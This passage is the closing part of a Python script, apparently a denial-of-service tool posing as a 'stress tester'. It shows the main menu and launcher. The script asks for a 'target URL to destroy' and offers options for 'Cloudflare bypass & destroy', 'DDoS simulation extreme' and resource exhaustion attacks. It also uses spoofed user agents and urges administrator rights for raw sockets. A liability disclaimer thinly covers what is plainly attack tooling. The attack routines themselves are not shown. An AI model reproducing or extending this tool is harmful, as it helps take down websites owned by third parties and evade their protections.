    print(f"{Fore.RED}    3. I accept CRIMINAL and CIVIL liability for unauthorized use")
    print(f"{Fore.RED}    4. I understand this tool is for LEGITIMATE STRESS TESTING only")
    print(f"{Fore.RED}    5. I will NOT use this for illegal purposes")
    
    accept = input(f"\n{Fore.RED}[?] Type 'I ACCEPT ALL RESPONSIBILITY' to continue: ")
    if accept != 'I ACCEPT ALL RESPONSIBILITY':
        print(f"{Fore.RED}[✗] You must accept full responsibility to continue")
        return
    
    # Get target URL
    if len(sys.argv) > 1:
        url = sys.argv[1]
        print(f"{Fore.GREEN}[✓] Target from arguments: {url}")
    else:
        url = input(f"\n{Fore.YELLOW}[?] Enter target URL to destroy (e.g., https://example.com): {Fore.WHITE}").strip()
        if not url:
            print(f"{Fore.RED}[✗] URL cannot be empty!")
            return
    
    tester = ExtremeWebServerTester(url)
    
    try:
        while True:
            main_menu()
            
            try:
                choice = input(f"\n{Fore.YELLOW}[?] Select option (0-7): {Fore.WHITE}").strip()
                
                if choice == '0':
                    print(f"\n{Fore.RED}[!] EMERGENCY STOP ACTIVATED")
                    tester.is_testing = False
                    tester.cleanup_all()
                    print(f"{Fore.GREEN}[✓] All attacks stopped")
                    break
                
                elif choice == '1':
                    tester.menu_1_extreme_attack()
                
                elif choice == '2':
                    print(f"\n{Fore.CYAN}{'='*60}")
                    print(f"{Fore.YELLOW}[*] CLOUDFLARE BYPASS & DESTROY")
                    print(f"{Fore.CYAN}{'='*60}")
                    print(f"{Fore.YELLOW}[!] Using Cloudflare bypass in main attack...")
                    tester.menu_1_extreme_attack()
                
                elif choice == '3':
                    print(f"\n{Fore.CYAN}{'='*60}")
                    print(f"{Fore.YELLOW}[*] DDoS SIMULATION EXTREME")
                    print(f"{Fore.CYAN}{'='*60}")
                    tester.menu_1_extreme_attack()
                
                elif choice == '4':
                    print(f"\n{Fore.CYAN}{'='*60}")
                    print(f"{Fore.YELLOW}[*] RESOURCE EXHAUSTION ATTACK")
                    print(f"{Fore.CYAN}{'='*60}")
                    tester.menu_1_extreme_attack()
                
                elif choice == '5':
                    if tester.results:
                        print(f"\n{Fore.CYAN}{'='*60}")
                        print(f"{Fore.YELLOW}[*] ATTACK RESULTS")
                        print(f"{Fore.CYAN}{'='*60}")
                        for key, value in tester.results.items():
                            print(f"{Fore.GREEN}{key.upper()}:")
                            for k, v in value.items():
                                print(f"  {k}: {v}")
                    else:
                        print(f"{Fore.YELLOW}[!] No attack results yet. Run an attack first.")
                
                elif choice == '6':
                    new_url = input(f"\n{Fore.YELLOW}[?] Enter new target URL: {Fore.WHITE}").strip()
                    if new_url:
                        tester = ExtremeWebServerTester(new_url)
                        print(f"{Fore.GREEN}[✓] Target changed to: {new_url}")
                    else:
                        print(f"{Fore.RED}[✗] Invalid URL!")
                
                elif choice == '7':
                    print(f"\n{Fore.CYAN}[*] Cleaning up and exiting...")
                    tester.cleanup_all()
                    print(f"{Fore.GREEN}[✓] Cleanup completed")
                    print(f"{Fore.YELLOW}[!] Remember: Use this power responsibly")
                    break
                
                else:
                    print(f"{Fore.RED}[✗] Invalid option!")
                
                input(f"\n{Fore.YELLOW}[?] Press Enter to continue...")
                display_banner()
                
            except KeyboardInterrupt:
                print(f"\n\n{Fore.YELLOW}[!] Operation interrupted by user")
                tester.is_testing = False
                time.sleep(1)
                continue
            
            except Exception as e:
                print(f"\n{Fore.RED}[✗] Error: {str(e)}")
                time.sleep(2)
    
    finally:
        # Always cleanup
        tester.cleanup_all()

if __name__ == "__main__":
    # Check requirements
    try:
        import requests
        import colorama
        from fake_useragent import UserAgent
    except ImportError:
        print(f"{Fore.RED}[✗] Missing packages. Install with:")
        print(f"{Fore.YELLOW}pip install requests colorama fake-useragent")
        sys.exit(1)
    
    # Check for admin privileges (helpful untuk raw sockets)
    if os.name == 'nt':
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                print(f"{Fore.YELLOW}[!] Run as Administrator for maximum effectiveness")
        except:
            pass
    
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Program terminated by user")
    except Exception as e:
        print(f"\n{Fore.RED}[✗] Fatal error: {str(e)}")